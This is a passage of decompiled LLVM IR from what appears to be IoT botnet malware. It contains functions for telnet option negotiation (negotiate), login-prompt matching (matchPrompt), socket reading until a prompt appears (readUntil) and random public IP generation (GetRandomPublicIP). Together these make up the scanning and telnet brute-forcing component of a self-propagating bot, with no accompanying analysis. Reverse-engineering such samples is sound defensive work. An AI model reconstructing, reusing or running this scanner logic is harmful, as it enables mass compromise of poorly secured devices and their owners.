  uselistorder i32 %v1_80498ec, { 2, 0, 1 }
  uselistorder i32 %v0_80498b8, { 1, 0 }
  uselistorder label %dec_label_pc_8049994, { 1, 0 }
  uselistorder label %dec_label_pc_804991f, { 1, 0 }
  uselistorder label %dec_label_pc_80498fd, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804999d = load i32, i32* @ebp, align 4
  store i32 %v0_804999d, i32* %stack_var_-4, align 4
  %v1_80499a6 = add i32 %arg2, 1
  %v1_80499a7 = inttoptr i32 %v1_80499a6 to i8*
  %v2_80499a7 = load i8, i8* %v1_80499a7, align 1
  %v9_80499b0 = icmp ult i8 %v2_80499a7, -5
  br i1 %v9_80499b0, label %dec_label_pc_8049abb, label %dec_label_pc_80499bd

dec_label_pc_80499bd:                             ; preds = %entry
  %v7_80499c4 = icmp eq i8 %v2_80499a7, -1
  br i1 %v7_80499c4, label %dec_label_pc_80499c6, label %dec_label_pc_80499e0

dec_label_pc_80499c6:                             ; preds = %dec_label_pc_80499bd
  br label %dec_label_pc_8049abb

dec_label_pc_80499e0:                             ; preds = %dec_label_pc_80499bd
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_80499f4 = ptrtoint i8* %stack_var_-5 to i32
  %v4_8049a01 = call i32 @__libc_send(i32 %arg1, i32 %v2_80499f4, i32 1, i32 16384)
  %v2_8049a0a = load i8, i8* %v1_80499a7, align 1
  %v11_8049a0d = icmp eq i8 %v2_8049a0a, -4
  %v1_8049a0f = icmp eq i1 %v11_8049a0d, false
  br i1 %v1_8049a0f, label %dec_label_pc_8049a17, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499e0
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a17:                             ; preds = %dec_label_pc_80499e0
  %v2_8049a1b = load i8, i8* %v1_80499a7, align 1
  %v11_8049a1e = icmp eq i8 %v2_8049a1b, -2
  %v1_8049a20 = icmp eq i1 %v11_8049a1e, false
  br i1 %v1_8049a20, label %dec_label_pc_8049a28, label %dec_label_pc_8049a22

dec_label_pc_8049a22:                             ; preds = %dec_label_pc_8049a17
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a28:                             ; preds = %dec_label_pc_8049a17
  %v2_8049a2c = load i8, i8* %v1_80499a7, align 1
  %v10_8049a2f = icmp eq i8 %v2_8049a2c, 3
  %v1_8049a31 = icmp eq i1 %v10_8049a2f, false
  %v11_8049a58 = icmp eq i8 %v2_8049a2c, -3
  %v1_8049a5a = icmp eq i1 %v11_8049a58, false
  br i1 %v1_8049a31, label %dec_label_pc_8049a51, label %dec_label_pc_8049a33

dec_label_pc_8049a33:                             ; preds = %dec_label_pc_8049a28
  %. = select i1 %v1_8049a5a, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a51:                             ; preds = %dec_label_pc_8049a28
  %.3 = select i1 %v1_8049a5a, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a6d:                             ; preds = %dec_label_pc_8049a33, %dec_label_pc_8049a22, %dec_label_pc_8049a11, %dec_label_pc_8049a51
  %v4_8049a8a = call i32 @__libc_send(i32 %arg1, i32 %v2_80499f4, i32 1, i32 16384)
  %v1_8049a92 = add i32 %arg2, 2
  %v4_8049aaf = call i32 @__libc_send(i32 %arg1, i32 %v1_8049a92, i32 1, i32 16384)
  %v2_8049abe.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049abb

dec_label_pc_8049abb:                             ; preds = %dec_label_pc_80499c6, %dec_label_pc_8049a6d, %entry
  %v2_8049abe = phi i32 [ %v0_804999d, %dec_label_pc_80499c6 ], [ %v2_8049abe.pre, %dec_label_pc_8049a6d ], [ %v0_804999d, %entry ]
  store i32 %v2_8049abe, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049abb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049a6d, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8049ace = ptrtoint i8* %arg1 to i32
  %v3_8049adf = call i32 @_strlen(i8* %arg1)
  %v4_8049adf = mul i32 %v3_8049adf, -1
  %v1_8049ae5 = sub i32 0, %v4_8049adf
  %v6_8049b0c = sub i32 %v4_8049ace, %v4_8049adf
  br label %dec_label_pc_8049b94

dec_label_pc_8049afc:                             ; preds = %dec_label_pc_8049b4f, %dec_label_pc_8049b37, %dec_label_pc_8049b1f, %dec_label_pc_8049b07
  %v4_8049afc = add nsw i32 %stack_var_-12.033, 1
  %v7_8049b05 = icmp slt i32 %v4_8049afc, %v1_8049ae5
  br i1 %v7_8049b05, label %dec_label_pc_8049b07, label %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge

dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge: ; preds = %dec_label_pc_8049afc, %dec_label_pc_8049aff.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049aff.preheader ], [ %v4_8049afc, %dec_label_pc_8049afc ]
  %.pre = sub i32 %v6_8049b0c, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049b67

dec_label_pc_8049b07:                             ; preds = %dec_label_pc_8049aff.preheader, %dec_label_pc_8049afc
  %stack_var_-12.033 = phi i32 [ %v4_8049afc, %dec_label_pc_8049afc ], [ %stack_var_-12.1, %dec_label_pc_8049aff.preheader ]
  %v2_8049b14 = sub i32 %v6_8049b0c, %stack_var_-12.033
  %v1_8049b18 = inttoptr i32 %v2_8049b14 to i8*
  %v2_8049b18 = load i8, i8* %v1_8049b18, align 1
  %v4_8049b1b = icmp eq i8 %v2_8049b18, 0
  br i1 %v4_8049b1b, label %dec_label_pc_8049afc, label %dec_label_pc_8049b1f

dec_label_pc_8049b1f:                             ; preds = %dec_label_pc_8049b07
  %v2_8049b30 = load i8, i8* %v1_8049b18, align 1
  %v7_8049b33 = icmp eq i8 %v2_8049b30, 32
  br i1 %v7_8049b33, label %dec_label_pc_8049afc, label %dec_label_pc_8049b37

dec_label_pc_8049b37:                             ; preds = %dec_label_pc_8049b1f
  %v2_8049b48 = load i8, i8* %v1_8049b18, align 1
  %v10_8049b4b = icmp eq i8 %v2_8049b48, 13
  br i1 %v10_8049b4b, label %dec_label_pc_8049afc, label %dec_label_pc_8049b4f

dec_label_pc_8049b4f:                             ; preds = %dec_label_pc_8049b37
  %v2_8049b60 = load i8, i8* %v1_8049b18, align 1
  %v10_8049b63 = icmp eq i8 %v2_8049b60, 10
  br i1 %v10_8049b63, label %dec_label_pc_8049afc, label %dec_label_pc_8049b67

dec_label_pc_8049b67:                             ; preds = %dec_label_pc_8049b4f, %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge
  %stack_var_-12.023 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge ], [ %stack_var_-12.033, %dec_label_pc_8049b4f ]
  %v1_8049b78.pre-phi = phi i8* [ %.pre10, %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge ], [ %v1_8049b18, %dec_label_pc_8049b4f ]
  %v2_8049b78 = load i8, i8* %v1_8049b78.pre-phi, align 1
  %v6_8049b7e = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_805893c.37 to i32)
  %v1_8049b81 = inttoptr i32 %v6_8049b7e to i8*
  %v2_8049b81 = load i8, i8* %v1_8049b81, align 1
  %v15_8049b84 = icmp eq i8 %v2_8049b78, %v2_8049b81
  %v1_8049b86 = icmp eq i1 %v15_8049b84, false
  br i1 %v1_8049b86, label %dec_label_pc_8049b91, label %dec_label_pc_8049bbe

dec_label_pc_8049b91:                             ; preds = %dec_label_pc_8049b67
  %v4_8049b91 = add i32 %storemerge3, 1
  br label %dec_label_pc_8049b94

dec_label_pc_8049b94:                             ; preds = %entry, %dec_label_pc_8049b91
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.023, %dec_label_pc_8049b91 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v4_8049b91, %dec_label_pc_8049b91 ]
  %v3_8049ba8 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805893c.37, i32 0, i32 0))
  %v7_8049baf = icmp ult i32 %storemerge3, %v3_8049ba8
  br i1 %v7_8049baf, label %dec_label_pc_8049aff.preheader, label %dec_label_pc_8049bbe

dec_label_pc_8049aff.preheader:                   ; preds = %dec_label_pc_8049b94
  %v7_8049b0532 = icmp slt i32 %stack_var_-12.1, %v1_8049ae5
  br i1 %v7_8049b0532, label %dec_label_pc_8049b07, label %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge

dec_label_pc_8049bbe:                             ; preds = %dec_label_pc_8049b94, %dec_label_pc_8049b67
  %storemerge = phi i32 [ 1, %dec_label_pc_8049b67 ], [ 0, %dec_label_pc_8049b94 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049b0c, { 1, 0 }
  uselistorder [6 x i8]* @global_var_805893c.37, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049b94, { 1, 0 }
  uselistorder label %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_8049c0d = ptrtoint i32* %stack_var_-160 to i32
  %tmp26 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049c27 = urem i32 %arg1, 32
  %v9_8049c2a = shl i32 1, %v1_8049c27
  %v1_8049c35 = add i32 %arg1, 1
  %v2_8049c36 = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049c6d = ptrtoint i8* %arg6 to i32
  %v2_8049d41 = inttoptr i32 %arg2 to i8*
  %v4_8049d4a = icmp eq i32 %arg3, 0
  %v1_8049d6b33 = add i32 %arg8, 2
  %v5_8049d7142 = icmp slt i32 %v1_8049d6b33, %arg7
  br i1 %v5_8049d7142, label %dec_label_pc_8049d73.lr.ph, label %dec_label_pc_8049d8f

dec_label_pc_8049d73.lr.ph:                       ; preds = %entry
  %v2_8049c21 = udiv i32 %arg1, 32
  %v2_8049c2a = mul nuw nsw i32 %v2_8049c21, 4
  %v3_8049c2a = add nsw i32 %v2_8049c2a, -156
  %tmp30 = icmp slt i32 %arg5, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br label %dec_label_pc_8049d73

dec_label_pc_8049c03:                             ; preds = %dec_label_pc_8049d81, %dec_label_pc_8049d73
  store i32 %v2_8049c0d, i32* @edi, align 4
  %v5_8049c14 = call i8* @_memset(i8* %tmp26, i32 0, i32 32)
  %v0_8049c2a = load i32, i32* @ebp, align 4
  %v4_8049c2a = add i32 %v3_8049c2a, %v0_8049c2a
  %v5_8049c2a = inttoptr i32 %v4_8049c2a to i32*
  %v6_8049c2a = load i32, i32* %v5_8049c2a, align 4
  %v12_8049c2a = or i32 %v6_8049c2a, %v9_8049c2a
  store i32 %v12_8049c2a, i32* %v5_8049c2a, align 4
  %v5_8049c5d = call i32 @__libc_select(i32 %v1_8049c35, i32 %v2_8049c0d, i32 0, i32 0, i32 %v2_8049c36)
  %tmp27 = icmp slt i32 %v5_8049c5d, 1
  br i1 %tmp27, label %dec_label_pc_8049d8f, label %dec_label_pc_8049c6a

dec_label_pc_8049c6a:                             ; preds = %dec_label_pc_8049c03
  %v6_8049c6d = add i32 %stack_var_-32.043, %v5_8049c6d
  %v5_8049c70 = inttoptr i32 %v6_8049c6d to i8*
  %v4_8049c90 = call i32 @__libc_recv(i32 %arg1, i32 %v6_8049c6d, i32 1, i32 0)
  %v13_8049c98 = icmp eq i32 %v4_8049c90, -1
  br i1 %v13_8049c98, label %dec_label_pc_8049dab, label %dec_label_pc_8049c9e

dec_label_pc_8049c9e:                             ; preds = %dec_label_pc_8049c6a
  %v4_8049c9e = icmp eq i32 %v4_8049c90, 0
  %v1_8049ca2 = icmp eq i1 %v4_8049c9e, false
  br i1 %v1_8049ca2, label %dec_label_pc_8049cb3, label %dec_label_pc_8049dab

dec_label_pc_8049cb3:                             ; preds = %dec_label_pc_8049c9e
  %v5_8049cb6 = add i32 %v4_8049c90, %stack_var_-32.043
  %v2_8049cbc = load i8, i8* %v5_8049c70, align 1
  %v11_8049cbf = icmp eq i8 %v2_8049cbc, -1
  %v1_8049cc1 = icmp eq i1 %v11_8049cbf, false
  br i1 %v1_8049cc1, label %dec_label_pc_8049d34, label %dec_label_pc_8049cc3

dec_label_pc_8049cc3:                             ; preds = %dec_label_pc_8049cb3
  %v1_8049cc6 = add i32 %v6_8049c6d, 1
  %v4_8049ce1 = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049cc6, i32 2, i32 0)
  %v13_8049ce9 = icmp eq i32 %v4_8049ce1, -1
  br i1 %v13_8049ce9, label %dec_label_pc_8049dab, label %dec_label_pc_8049cef

dec_label_pc_8049cef:                             ; preds = %dec_label_pc_8049cc3
  %v4_8049cef = icmp eq i32 %v4_8049ce1, 0
  %v1_8049cf3 = icmp eq i1 %v4_8049cef, false
  br i1 %v1_8049cf3, label %dec_label_pc_8049d04, label %dec_label_pc_8049dab

dec_label_pc_8049d04:                             ; preds = %dec_label_pc_8049cef
  %v5_8049d07 = add i32 %v4_8049ce1, %v5_8049cb6
  %v3_8049d1f = call i32 @negotiate(i32 %arg1, i32 %v6_8049c6d, i32 3)
  %v1_8049d24 = icmp eq i32 %v3_8049d1f, 0
  %v1_8049d26 = icmp eq i1 %v1_8049d24, false
  br i1 %v1_8049d26, label %dec_label_pc_8049d68.backedge, label %dec_label_pc_8049dab

dec_label_pc_8049d68.backedge:                    ; preds = %dec_label_pc_8049d04, %dec_label_pc_8049d4a, %dec_label_pc_8049d50
  %stack_var_-32.0.be = phi i32 [ %v5_8049cb6, %dec_label_pc_8049d4a ], [ %v5_8049cb6, %dec_label_pc_8049d50 ], [ %v5_8049d07, %dec_label_pc_8049d04 ]
  %v1_8049d6b = add i32 %stack_var_-32.0.be, 2
  %v5_8049d71 = icmp slt i32 %v1_8049d6b, %arg7
  br i1 %v5_8049d71, label %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge, label %dec_label_pc_8049d8f

dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge: ; preds = %dec_label_pc_8049d68.backedge
  %v3_8049d73.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049d73

dec_label_pc_8049d34:                             ; preds = %dec_label_pc_8049cb3
  %v3_8049d41 = call i32 @strstr(i32 %v5_8049c6d, i8* %v2_8049d41)
  %v1_8049d46 = icmp eq i32 %v3_8049d41, 0
  %v1_8049d48 = icmp eq i1 %v1_8049d46, false
  br i1 %v1_8049d48, label %dec_label_pc_8049d8f, label %dec_label_pc_8049d4a

dec_label_pc_8049d4a:                             ; preds = %dec_label_pc_8049d34
  br i1 %v4_8049d4a, label %dec_label_pc_8049d68.backedge, label %dec_label_pc_8049d50

dec_label_pc_8049d50:                             ; preds = %dec_label_pc_8049d4a
  %v2_8049d56 = call i32 @matchPrompt(i8* %arg6)
  %v1_8049d5b = icmp eq i32 %v2_8049d56, 0
  br i1 %v1_8049d5b, label %dec_label_pc_8049d68.backedge, label %dec_label_pc_8049d8f

dec_label_pc_8049d73:                             ; preds = %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge, %dec_label_pc_8049d73.lr.ph
  %v3_8049d73 = phi i32 [ %arg4, %dec_label_pc_8049d73.lr.ph ], [ %v3_8049d73.pre, %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge ]
  %stack_var_-32.043 = phi i32 [ %arg8, %dec_label_pc_8049d73.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge ]
  %tmp28 = icmp slt i32 %v3_8049d73, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_8049c03, label %dec_label_pc_8049d81

dec_label_pc_8049d81:                             ; preds = %dec_label_pc_8049d73
  br i1 %tmp31, label %dec_label_pc_8049c03, label %dec_label_pc_8049d8f

dec_label_pc_8049d8f:                             ; preds = %dec_label_pc_8049c03, %dec_label_pc_8049d81, %dec_label_pc_8049d68.backedge, %dec_label_pc_8049d50, %dec_label_pc_8049d34, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8049d34 ], [ 1, %dec_label_pc_8049d50 ], [ 0, %dec_label_pc_8049d68.backedge ], [ 0, %dec_label_pc_8049d81 ], [ 0, %dec_label_pc_8049c03 ]
  br label %dec_label_pc_8049dab

dec_label_pc_8049dab:                             ; preds = %dec_label_pc_8049d04, %dec_label_pc_8049cc3, %dec_label_pc_8049cef, %dec_label_pc_8049c6a, %dec_label_pc_8049c9e, %dec_label_pc_8049d8f
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049d8f ], [ 0, %dec_label_pc_8049c9e ], [ 0, %dec_label_pc_8049c6a ], [ 0, %dec_label_pc_8049cef ], [ 0, %dec_label_pc_8049cc3 ], [ 0, %dec_label_pc_8049d04 ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_8049ce1, { 1, 2, 0 }
  uselistorder i32 %v4_8049c90, { 1, 2, 0 }
  uselistorder i32 %v5_8049c6d, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049dab, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049d8f, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049d68.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049dbd = load i32, i32* @ebx, align 4
  store i32 %v0_8049dbd, i32* %stack_var_-8, align 4
  store i8 0, i8* bitcast (i32* @global_var_805c537.38 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_805c538.39 to i8*), align 8
  store i8 0, i8* @global_var_805c539.40, align 1
  store i8 0, i8* @global_var_805c53a.41, align 2
  %v1_8049ddd = call i32 @random()
  %v2_8049dff = sdiv i32 %v1_8049ddd, 51
  store i32 %v2_8049dff, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049dff, -255
  %v2_8049e0f = add i32 %v1_8049ddd, %tmp
  %v14_8049e0f = trunc i32 %v2_8049e0f to i8
  store i32 %v2_8049e0f, i32* @eax, align 4
  store i8 %v14_8049e0f, i8* bitcast (i32* @global_var_805c537.38 to i8*), align 4
  %v1_8049e1d = call i32 @random()
  %v2_8049e3f = sdiv i32 %v1_8049e1d, 51
  store i32 %v2_8049e3f, i32* @ebx, align 4
  %tmp21 = mul i32 %v2_8049e3f, -255
  %v2_8049e4f = add i32 %v1_8049e1d, %tmp21
  %v14_8049e4f = trunc i32 %v2_8049e4f to i8
  store i32 %v2_8049e4f, i32* @eax, align 4
  store i8 %v14_8049e4f, i8* bitcast (i32* @global_var_805c538.39 to i8*), align 8
  %v1_8049e5d = call i32 @random()
  %v2_8049e7f = sdiv i32 %v1_8049e5d, 51
  store i32 %v2_8049e7f, i32* @ebx, align 4
  %tmp22 = mul i32 %v2_8049e7f, -255
  %v2_8049e8f = add i32 %v1_8049e5d, %tmp22
  %v14_8049e8f = trunc i32 %v2_8049e8f to i8
  store i32 %v2_8049e8f, i32* @eax, align 4
  store i8 %v14_8049e8f, i8* @global_var_805c539.40, align 1
  %v1_8049e9d = call i32 @random()
  %v2_8049ebf = sdiv i32 %v1_8049e9d, 51
  store i32 %v2_8049ebf, i32* @ebx, align 4
  %tmp23 = mul i32 %v2_8049ebf, -255
  %v2_8049ecf = add i32 %v1_8049e9d, %tmp23
  %v14_8049ecf = trunc i32 %v2_8049ecf to i8
  store i32 %v2_8049ecf, i32* @eax, align 4
  store i8 %v14_8049ecf, i8* @global_var_805c53a.41, align 2
  %v1_8049edd = call i32 @random()
  %v2_8049efa = srem i32 %v1_8049edd, 208
  %v12_8049f14 = icmp eq i32 %v2_8049efa, 0
  store i32 %v2_8049efa, i32* @edx, align 4
  %v1_8049f1f = icmp eq i1 %v12_8049f14, false
  br i1 %v1_8049f1f, label %dec_label_pc_8049f51, label %dec_label_pc_8049f21

dec_label_pc_8049f21:                             ; preds = %entry
  %v0_8049f21 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_8049f21 = zext i8 %v0_8049f21 to i32
  store i32 %v1_8049f21, i32* @edx, align 4
  %v0_8049f2b = load i8, i8* @global_var_805c539.40, align 1
  %v1_8049f2b = zext i8 %v0_8049f2b to i32
  %v2_8049f3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f3a, i32* @ebx, align 4
  %v4_8049f4c = call i32 @szprintf(i32 %v2_8049f3a, i32 ptrtoint ([12 x i8]* @global_var_8058943.42 to i32), i32 %v1_8049f2b)
  br label %dec_label_pc_8049f51

dec_label_pc_8049f51:                             ; preds = %entry, %dec_label_pc_8049f21
  %v13_8049f51 = icmp eq i32 %v2_8049efa, 1
  %v1_8049f55 = icmp eq i1 %v13_8049f51, false
  br i1 %v1_8049f55, label %dec_label_pc_8049f87, label %dec_label_pc_8049f57

dec_label_pc_8049f57:                             ; preds = %dec_label_pc_8049f51
  %v0_8049f57 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_8049f57 = zext i8 %v0_8049f57 to i32
  store i32 %v1_8049f57, i32* @edx, align 4
  %v0_8049f61 = load i8, i8* @global_var_805c539.40, align 1
  %v1_8049f61 = zext i8 %v0_8049f61 to i32
  %v2_8049f70 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f70, i32* @ebx, align 4
  %v4_8049f82 = call i32 @szprintf(i32 %v2_8049f70, i32 ptrtoint ([14 x i8]* @global_var_805894f.43 to i32), i32 %v1_8049f61)
  br label %dec_label_pc_8049f87

dec_label_pc_8049f87:                             ; preds = %dec_label_pc_8049f51, %dec_label_pc_8049f57
  %v13_8049f87 = icmp eq i32 %v2_8049efa, 2
  %v1_8049f8b = icmp eq i1 %v13_8049f87, false
  br i1 %v1_8049f8b, label %dec_label_pc_8049fbd, label %dec_label_pc_8049f8d

dec_label_pc_8049f8d:                             ; preds = %dec_label_pc_8049f87
  %v0_8049f8d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_8049f8d = zext i8 %v0_8049f8d to i32
  store i32 %v1_8049f8d, i32* @edx, align 4
  %v0_8049f97 = load i8, i8* @global_var_805c539.40, align 1
  %v1_8049f97 = zext i8 %v0_8049f97 to i32
  %v2_8049fa6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fa6, i32* @ebx, align 4
  %v4_8049fb8 = call i32 @szprintf(i32 %v2_8049fa6, i32 ptrtoint ([11 x i8]* @global_var_805895d.44 to i32), i32 %v1_8049f97)
  br label %dec_label_pc_8049fbd

dec_label_pc_8049fbd:                             ; preds = %dec_label_pc_8049f87, %dec_label_pc_8049f8d
  %v13_8049fbd = icmp eq i32 %v2_8049efa, 3
  %v1_8049fc1 = icmp eq i1 %v13_8049fbd, false
  br i1 %v1_8049fc1, label %dec_label_pc_8049ff3, label %dec_label_pc_8049fc3

dec_label_pc_8049fc3:                             ; preds = %dec_label_pc_8049fbd
  %v0_8049fc3 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_8049fc3 = zext i8 %v0_8049fc3 to i32
  store i32 %v1_8049fc3, i32* @edx, align 4
  %v0_8049fcd = load i8, i8* @global_var_805c539.40, align 1
  %v1_8049fcd = zext i8 %v0_8049fcd to i32
  %v2_8049fdc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fdc, i32* @ebx, align 4
  %v4_8049fee = call i32 @szprintf(i32 %v2_8049fdc, i32 ptrtoint ([13 x i8]* @global_var_8058968.45 to i32), i32 %v1_8049fcd)
  br label %dec_label_pc_8049ff3

dec_label_pc_8049ff3:                             ; preds = %dec_label_pc_8049fbd, %dec_label_pc_8049fc3
  %v13_8049ff3 = icmp eq i32 %v2_8049efa, 4
  %v1_8049ff7 = icmp eq i1 %v13_8049ff3, false
  br i1 %v1_8049ff7, label %dec_label_pc_804a029, label %dec_label_pc_8049ff9

dec_label_pc_8049ff9:                             ; preds = %dec_label_pc_8049ff3
  %v0_8049ff9 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_8049ff9 = zext i8 %v0_8049ff9 to i32
  store i32 %v1_8049ff9, i32* @edx, align 4
  %v0_804a003 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a003 = zext i8 %v0_804a003 to i32
  %v2_804a012 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a012, i32* @ebx, align 4
  %v4_804a024 = call i32 @szprintf(i32 %v2_804a012, i32 ptrtoint ([11 x i8]* @global_var_8058975.46 to i32), i32 %v1_804a003)
  br label %dec_label_pc_804a029

dec_label_pc_804a029:                             ; preds = %dec_label_pc_8049ff3, %dec_label_pc_8049ff9
  %v13_804a029 = icmp eq i32 %v2_8049efa, 5
  %v1_804a02d = icmp eq i1 %v13_804a029, false
  br i1 %v1_804a02d, label %dec_label_pc_804a05f, label %dec_label_pc_804a02f

dec_label_pc_804a02f:                             ; preds = %dec_label_pc_804a029
  %v0_804a02f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a02f = zext i8 %v0_804a02f to i32
  store i32 %v1_804a02f, i32* @edx, align 4
  %v0_804a039 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a039 = zext i8 %v0_804a039 to i32
  %v2_804a048 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a048, i32* @ebx, align 4
  %v4_804a05a = call i32 @szprintf(i32 %v2_804a048, i32 ptrtoint ([13 x i8]* @global_var_8058980.47 to i32), i32 %v1_804a039)
  br label %dec_label_pc_804a05f

dec_label_pc_804a05f:                             ; preds = %dec_label_pc_804a029, %dec_label_pc_804a02f
  %v13_804a05f = icmp eq i32 %v2_8049efa, 6
  %v1_804a063 = icmp eq i1 %v13_804a05f, false
  br i1 %v1_804a063, label %dec_label_pc_804a095, label %dec_label_pc_804a065

dec_label_pc_804a065:                             ; preds = %dec_label_pc_804a05f
  %v0_804a065 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a065 = zext i8 %v0_804a065 to i32
  store i32 %v1_804a065, i32* @edx, align 4
  %v0_804a06f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a06f = zext i8 %v0_804a06f to i32
  %v2_804a07e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a07e, i32* @ebx, align 4
  %v4_804a090 = call i32 @szprintf(i32 %v2_804a07e, i32 ptrtoint ([12 x i8]* @global_var_805898d.48 to i32), i32 %v1_804a06f)
  br label %dec_label_pc_804a095

dec_label_pc_804a095:                             ; preds = %dec_label_pc_804a05f, %dec_label_pc_804a065
  %v13_804a095 = icmp eq i32 %v2_8049efa, 7
  %v1_804a099 = icmp eq i1 %v13_804a095, false
  br i1 %v1_804a099, label %dec_label_pc_804a0cb, label %dec_label_pc_804a09b

dec_label_pc_804a09b:                             ; preds = %dec_label_pc_804a095
  %v0_804a09b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a09b = zext i8 %v0_804a09b to i32
  store i32 %v1_804a09b, i32* @edx, align 4
  %v0_804a0a5 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a0a5 = zext i8 %v0_804a0a5 to i32
  %v2_804a0b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0b4, i32* @ebx, align 4
  %v4_804a0c6 = call i32 @szprintf(i32 %v2_804a0b4, i32 ptrtoint ([13 x i8]* @global_var_8058999.49 to i32), i32 %v1_804a0a5)
  br label %dec_label_pc_804a0cb

dec_label_pc_804a0cb:                             ; preds = %dec_label_pc_804a095, %dec_label_pc_804a09b
  %v13_804a0cb = icmp eq i32 %v2_8049efa, 8
  %v1_804a0cf = icmp eq i1 %v13_804a0cb, false
  br i1 %v1_804a0cf, label %dec_label_pc_804a101, label %dec_label_pc_804a0d1

dec_label_pc_804a0d1:                             ; preds = %dec_label_pc_804a0cb
  %v0_804a0d1 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a0d1 = zext i8 %v0_804a0d1 to i32
  store i32 %v1_804a0d1, i32* @edx, align 4
  %v0_804a0db = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a0db = zext i8 %v0_804a0db to i32
